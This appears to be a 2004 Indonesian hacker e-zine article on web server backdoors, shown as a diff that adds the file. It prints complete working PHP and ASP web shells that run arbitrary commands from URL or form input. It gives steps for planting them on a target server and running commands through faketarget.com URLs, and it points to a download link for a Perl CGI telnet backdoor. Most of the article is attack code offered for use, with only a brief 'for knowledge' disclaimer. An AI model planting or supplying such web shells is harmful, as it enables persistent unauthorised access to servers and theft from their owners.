@@ -1,0 +1,176 @@
+____________________   ___ ___ ________   
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+    .OR.ID
+ECHO-ZINE RELEASE
+       06
+Author: the_day || the_day@echo.or.id
+Online @ www.echo.or.id :: http://ezine.echo.or.id 
+
+==Jenis-Jenis Backdooring Pada WebServer==
+	
+Dalam artikel ini ,saya akan mencoba membahas sedikit tentang sistem backdooring pada Webserver.
+Backdoor biasanya digunakan attacker untuk kembali masuk ke server target yg sudah pernah dikuasainya.
+Ada backdoor yg di access lewat shell dengan membuka port tertentu seperti shv4 dan ada backdoor yang
+di access lewat web "Backdooring web" dgn menumpang port 80 untuk menjalankan nya ,dan mengaksesnya pun
+lewat browser .
+Disini saya cuma akan membahas tentang backdoor yg di access lewat browser .
+Seperti kita ketahuan ada banyak sekali jenis web server dan setiap web server mempuyai language yg berbeda
+pula . Backdoor disini dibuat dengan bahasa-bahasa web programing seperti ASP,PHP dan Perl.dan 
+dengan web server yang umum digunakan.
+	
+	= Jenis Web Server dan Bahasa Programing  :
+		
+		==========================================================
+		||	Web Server	||	language support	||
+		==========================================================
+		|| IIS 			|| ASP,Perl/Cgi,cfm,php		||
+		||------------------------------------------------------||
+		||Apache		|| PHP,Cgi			||
+		==========================================================
+		Table diatas merupakan web server yang umum digunakan .
+	
+	= Jenis Backdoor Menurut Bahasa Programing dan Web Server :
+		
+		1. PHP Shell	
+			PHP shell merupakan backdoor dari script php yang fungsinya untuk menjalankan
+			remote shell melalui web .Contoh Sederhana dari php shell :
+			----------------------------------------------------------------------
+			<?
+  			// CMD - To Execute Command on File Injection Bug ( gif - jpg - txt )
+  			if (isset($chdir)) @chdir($chdir);
+  			ob_start();
+  			system("$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
+  			$output = ob_get_contents();
+  			ob_end_clean();
+  			if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
+			?>			
+			------------------------------------------------------------------------
+			save script diatas dgn nama cmd.php dan letakan di web server target mis di
+			/home/user98/htdcos/images/cmd.php
+			Untuk Menjalankan backdoor tadi buka browser dan ketikan di alamat target
+			ex : http://faketarget.com/images/cmd.php?cmd=uname -a
+				Linux source1.sourcedns1.com 2.4.20-28.7smp #1 SMP Thu Dec 18 11:18:31 
+				EST 2003 i686 unknown
+			Jadi http://faketarget.com/images/cmd.php?cmd=unix command
+			Kita masih bisa mengakses target melalui browser.
+		
+		2. ASP Shell
+			ASP shell sama dengan PHP shell dan semua backdoor disini sistemnya sama aja.
+			Dalam asp shell kita membuat backdoor dengan script asp dan membuat script tersebut
+			bisa mengeksekusi cmd.exe yang ada di web server target .contoh asp shell sederhana
+			----------------------------------------------------------------------------
+			<%@ Language=VBScript %>
+			<%
+			' cmd.asp adapted by all windows
+			' coded by CupiD^ #powHACK
+			Dim oScript
+			Dim oScriptNet 
+			Dim oFileSys, oFile
+			Dim szCMD, szTempFile
+			On Error Resume Next
+			Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+			Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+			Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")  
+			szCMD = Request.Form(".CMD")
+			If (szCMD <> "") Then
+			szTempFile = "C:\" & oFileSys.GetTempName( )    
+			Call oScript.Run ("cmd1.exe /c " & szCMD & " > " & szTempFile, 0, True)
+			Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+			Call oScript.Run ("command.exe /c " & szCMD & " > " & szTempFile, 0, True)
+			Call oScript.Run ("command.com /c " & szCMD & " > " & szTempFile, 0, True)
+			Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) 
+			End If
+			%>
+			<head>
+			<title>CmD ExPlOiT</title>
+			</head>
+			<body bgcolor="#000000">
+			<p style="margin-top: 0; margin-bottom: 0"><font color="#00FF00"><b>Computer
+			Name:
+			<%= "\\" & oScriptNet.ComputerName %></b></font></p>
+			<p style="margin-top: 0; margin-bottom: 0"><font color="#00FF00"><b>User Name:<%="\\" & oScriptNet.UserName %></b></font></p>
+			<p style="margin-top: 0; margin-bottom: 0"><font color="#00FF00"><b>HostName:</b><%=server.mappath("cmd.asp")%></font></p>
+			<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+			<p align="center" style="margin-top: 0; margin-bottom: 0">
+			<font color="#00FF00"><b><i>Type DOS Command Here</i></b></font>E &lt;Enter&gt;
+			<p align="left" style="margin-top: 0; margin-bottom: 0">
+			<font color="#00FF00">
+			<input type=text name=".CMD" size=83 value="<%= szCMD %>" style="color: #00FF00; background-color: ##00FF00; border-style: solid; border-color: #000000">
+			<input type=submit value="<Click>" style="color: #00000; background-color: #00000; border-style: solid; border-color: #000000">
+			</font>
+			</FORM>
+			<div align="left">
+			<pre style="margin-top: 0; margin-bottom: 0"><font color="#FFFFFF">
+			<% 
+			If (IsObject(oFile)) Then
+			On Error Resume Next
+			Response.Write Server.HTMLEncode(oFile.ReadAll)
+			oFile.Close
+			Call oFileSys.DeleteFile(szTempFile, True)
+			End If
+			%>
+			</font></pre>
+			</div>
+			------------------------------------------------------------------------------------
+			save dgn nama test.asp di dir tempat web nya ex : D:\host\indianacom\www\images\test.asp
+			untuk mengaksesnya lewat browser tinggal http://faketarget.com/images/test.asp
+			
+		3. CGI Telnet
+			Cgi telnet sama seperti kedua backdoor diatas ,sama2 remote shell ,bisa digunakan di apache
+			dan IIS .Backdoor ini dibuat dengan bahasa programing perl dan di save di dir cgi-bin umumnya.
+			Untuk scriptnya bs di ambil di http://echostaff.hostrocket.com/test.txt
+			jgn lupa di rename menjadi test.pl,disave di folder cgi-bin dan di chmod +x kalau di apache 
+			Untuk mengaksesnya http://faketarget.com/cgi-bin/test.pl
+			----------------------------------------------------------------------------------
+			Trying www.bluemoon-design.co.uk...
+			Connected to www.bluemoon-design.co.uk
+			Escape character is ^] 
+
+			 _____  _____  _____          _____        _               _
+			/  __ \|  __ \|_   _|        |_   _|      | |             | |
+			| /  \/| |  \/  | |   ______   | |    ___ | | _ __    ___ | |_
+			| |    | | __   | |  |______|  | |   / _ \| || '_ \  / _ \| __|
+			| \__/\| |_\ \ _| |_           | |  |  __/| || | | ||  __/| |_
+ 			\____/ \____/ \___/            \_/   \___||_||_| |_| \___| \__| 1.0
+                                         
+			                      ______             © 2001, Rohitab Batra
+			                   .-"      "-.
+			                 /            \
+                 			|              |
+                 			|,  .-.  .-.  ,|
+                 			| )(_o/  \o_)( |
+                 			|/     /\     \|
+       				(@_       (_   ^^     _)
+  			 _     ) \_______\__|IIIIII|__/_______________________
+ 			(_)@8@8{}<________|-\IIIIII/-|________________________>
+        			)_/        \          / 
+       				(@          `--------`
+             			W A R N I N G: Private Server
+					
+			-----------------------------------------------------------------------------------
+
+	Ok Mungkin segini aja yang bisa aku kasih ,mungkin akan menambah sedikit pengetahuan .Ingat artikel ini
+	ditunjukan hanya untuk pengetahuan saja ,semua resiko di tanggung sendiri2 , dan pesan untuk para sys admin
+	web server spt syadmin telkomnetinstan.com "mas welly",sys admi nya uhahost "mas ilyasth" dan utk yang lain
+	Ga ada 100 Server yang secure semua ada di tangan admin nya .
+	
+EOF
+                                                                  
+								  
+								  					
+													[the_day]
+   
+	Created :24:06:04-19:10
+	Dedicated for Ultahnya Mitha :)
+	*greetz to: 
+	[echostaff a.k.a y3dips, moby, comex ,z3r0byt3,K-159,c-a-s-e,S`to] 
+	m_beben,yudhax,Bithedz,Lieur-Euy,Biatch-X
+	anak2 newbie_hacker,$the community,$peci@l temen2 seperjuangan 
+	kritik && saran kirimkan ke the_day[at]echo.or.id
+	And All #e-c-h-o & #aikmel Crew
+	#e-c-h-o & #aikmel @dal.net
